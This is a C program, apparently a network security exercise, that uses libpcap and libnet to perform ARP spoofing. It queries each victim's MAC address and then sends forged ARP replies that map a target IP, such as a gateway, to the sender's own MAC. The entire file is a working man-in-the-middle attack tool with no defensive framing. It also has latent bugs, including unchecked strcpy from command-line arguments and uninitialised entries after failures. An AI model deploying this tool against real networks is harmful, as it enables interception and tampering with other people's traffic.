#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>

typedef struct {
	char sender_ip[16];
	uint8_t sender_mac[6];
	char target_ip[16];
} arp_pair;

void usage() {
	printf("syntax: main <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: main wlan0 192.168.10.2 192.168.10.1\n");
}

int get_mac(const char* dev, uint8_t* mac) {
	libnet_t* ln = libnet_init(LIBNET_LINK, dev, NULL);
	if (ln == NULL) {
		fprintf(stderr, "libnet_init failed\n");
		return -1;
	}

	struct libnet_ether_addr* my_mac = libnet_get_hwaddr(ln);
	if (my_mac == NULL) {
		fprintf(stderr, "libnet_get_hwaddr failed\n");
		libnet_destroy(ln);
		return -1;
	}

	memcpy(mac, my_mac->ether_addr_octet, 6);
	libnet_destroy(ln);
	return 0;
}

int send_request(pcap_t* pcap, uint8_t* my_mac, char* my_ip, char* victim_ip) {
	uint8_t packet[42];
	memset(packet, 0, sizeof(packet));

	struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
	memset(eth_hdr->ether_dhost, 0xff, ETHER_ADDR_LEN);
	memcpy(eth_hdr->ether_shost, my_mac, ETHER_ADDR_LEN);
	eth_hdr->ether_type = htons(ETHERTYPE_ARP);

	struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr->ar_pro = htons(ETHERTYPE_IP);
	arp_hdr->ar_hln = 6;
	arp_hdr->ar_pln = 4;
	arp_hdr->ar_op = htons(ARPOP_REQUEST);

	uint8_t* arp_data = packet + LIBNET_ETH_H + LIBNET_ARP_H;
	memcpy(arp_data, my_mac, 6);
	arp_data += 6;

	struct in_addr addr;
	inet_pton(AF_INET, my_ip, &addr);
	memcpy(arp_data, &addr, 4);
	arp_data += 4;

	memset(arp_data, 0, 6);
	arp_data += 6;

	inet_pton(AF_INET, victim_ip, &addr);
	memcpy(arp_data, &addr, 4);

	pcap_sendpacket(pcap, packet, sizeof(packet));

	return 0;
}

int get_reply(pcap_t* pcap, char* victim_ip, uint8_t* victim_mac) {
	struct pcap_pkthdr* header;
	const u_char* packet;

	struct in_addr victim_addr;
	inet_pton(AF_INET, victim_ip, &victim_addr);

	for (int i = 0; i < 15; i++) {
		int res = pcap_next_ex(pcap, &header, &packet);

		if (res == 0) {
			continue;
		}
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}

		struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
		if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP) {
			continue;
		}

		struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
		if (ntohs(arp_hdr->ar_op) != ARPOP_REPLY) {
			continue;
		}

		u_int8_t* sender_mac_ptr = (u_int8_t*)(packet + LIBNET_ETH_H + LIBNET_ARP_H);
		u_int8_t* sender_ip_ptr = (u_int8_t*)(packet + LIBNET_ETH_H + LIBNET_ARP_H + arp_hdr->ar_hln);

		if (memcmp(sender_ip_ptr, &victim_addr.s_addr, 4) != 0) {
			continue;
		}

		memcpy(victim_mac, sender_mac_ptr, 6);
		return 0;
	}

	fprintf(stderr, "%s: Timeout ARP reply\n", victim_ip);
	return -1;
}

int send_poison(pcap_t* pcap, const uint8_t* my_mac, const uint8_t* victim_mac, const char* victim_ip, const char* target_ip) {
	uint8_t packet[42];
	memset(packet, 0, sizeof(packet));

	struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
	memcpy(eth_hdr->ether_dhost, victim_mac, ETHER_ADDR_LEN);
	memcpy(eth_hdr->ether_shost, my_mac, ETHER_ADDR_LEN);
	eth_hdr->ether_type = htons(ETHERTYPE_ARP);

	struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr->ar_pro = htons(ETHERTYPE_IP);
	arp_hdr->ar_hln = 6;
	arp_hdr->ar_pln = 4;
	arp_hdr->ar_op = htons(ARPOP_REPLY);

	uint8_t* arp_data = packet + LIBNET_ETH_H + LIBNET_ARP_H;

	memcpy(arp_data, my_mac, 6);
	arp_data += 6;
	struct in_addr addr;
	inet_pton(AF_INET, target_ip, &addr);
	memcpy(arp_data, &addr, 4);
	arp_data += 4;

	memcpy(arp_data, victim_mac, 6);
	arp_data += 6;

	inet_pton(AF_INET, victim_ip, &addr);
	memcpy(arp_data, &addr, 4);

	if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
		fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(pcap));
		return -1;
	}

	return 0;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	uint8_t my_mac[6];
	if (get_mac(dev, my_mac) != 0) {
		fprintf(stderr, "Failed to get my MAC address\n");
		return -1;
	}

	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	int cnt = (argc - 2) / 2;

	arp_pair* pairs = (arp_pair*)malloc(cnt * sizeof(arp_pair));
	if (pairs == NULL) {
		fprintf(stderr, "Memory allocation failed\n");
		pcap_close(pcap);
		return -1;
	}

	char my_ip[16] = "0.0.0.0";

	for (int i = 0; i < cnt; i++) {
		int arg_index = 2 + i * 2;
		char* sender_ip = argv[arg_index];
		char* target_ip = argv[arg_index + 1];

		uint8_t sender_mac[6];
		if (send_request(pcap, my_mac, my_ip, sender_ip) != 0) {
			fprintf(stderr, "%s: Failed to send ARP request\n", sender_ip);
			continue;
		}

		if (get_reply(pcap, sender_ip, sender_mac) != 0) {
			fprintf(stderr, "%s: Failed to get MAC address\n", sender_ip);
			continue;
		}

		strcpy(pairs[i].sender_ip, sender_ip);
		memcpy(pairs[i].sender_mac, sender_mac, 6);
		strcpy(pairs[i].target_ip, target_ip);
	}

	for (int i = 0; i < cnt; i++) {
		send_poison(pcap, my_mac, pairs[i].sender_mac, pairs[i].sender_ip, pairs[i].target_ip);
	}

	free(pairs);
	pcap_close(pcap);
	return 0;
}
